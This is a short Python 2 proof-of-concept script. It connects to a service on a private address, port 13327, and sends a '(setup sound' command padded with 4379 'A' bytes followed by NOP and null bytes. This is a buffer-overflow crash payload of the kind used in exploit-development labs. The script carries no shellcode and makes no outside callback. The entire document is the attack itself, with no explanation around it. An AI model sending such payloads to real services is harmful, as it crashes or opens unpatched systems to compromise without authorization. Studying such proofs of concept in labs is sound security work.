#!/usr/bin/python
import socket

target = "192.168.198.44"
port = 13327

crash = "\x41" * 4379
buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]SENDING BUFFER[*]"

s.connect((target,port))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]PAYLOAD SENT ... CLOSING[*]"